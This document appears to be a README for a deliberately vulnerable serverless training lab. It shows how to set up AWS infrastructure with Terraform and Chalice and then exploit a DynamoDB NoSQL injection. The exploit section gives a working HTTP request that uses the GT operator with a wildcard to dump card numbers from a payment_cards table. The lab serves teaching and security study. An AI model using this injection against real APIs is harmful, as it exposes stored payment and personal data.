## IAM Privilege Escalation - DynamoDB Injection

This attack/payload has been documented in [this](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac) article.

On reading, you'll see that its a NoSQL Injection attack that's predicated on using the `gt` operator. One of the main reasons that this attack is made possible, is because of badly configured IAM privileges

### Setup - Infrastructure
We will be using `Terraform` to setup the AWS services and IAM privileges for this lab to work. Please install `Terraform` if you haven't already

[Terraform](https://www.terraform.io/downloads.html)

* In the [ops](iam_privilege_escalation/ops) directory, you'll find the file [db_provision.tf](iam_privilege_escalation/ops/db_provision.tf)
* This will create:
    * The IAM Privileges, Roles and Policies required for this lab to work
    * The DynamoDB database tables required for this (and other) labs to work
    * Loads dummy content into the DynamoDB tables using the `Faker` library
    * Writes a `config.json` file that you can directly copy into the `.chalice` directory in `iam_privilege_escalation/bad-dynamo-search` directory and deploy

### Setup - Chalice
* In the directory `bad-dynamo-search` there should be a `.chalice` directory which has a `config-sample.json`.
* Copy the `config.json` generated in the `ops` directory after you run terraform and paste it in the `.chalice` directory of `bad-dynamo-search`
* Once done, run `chalice deploy` to deploy the function to your AWS Lambda account

this should give you an output with the end-url and other details:

```
Creating deployment package.
Updating lambda function: dvfaas-XXXX
Updating lambda function: dvfaas-xxxx
Updating rest API
Resources deployed:
  - Lambda ARN: arn:aws:lambda:us-east-1:112222211:function:dvfaas-xxxx
  - Lambda ARN: arn:aws:lambda:us-east-1:112222211:function:dvfaas-xxxx
  - Rest API URL: https://xxxx.execute-api.us-east-1.amazonaws.com/api/

```

### Exploit
* Once you are done with the deploy, you can use a HTTP Client or `httpie` to call the function

#### Genuine search with the REST API Function against the user database

```
http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=<db_name> search_term=Mark search_operator=EQ search_field=first_name
```

Now for the exploit
```
http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=<db_name (payment_cards)> search_term="*" search_operator=GT search_field=card_number
```

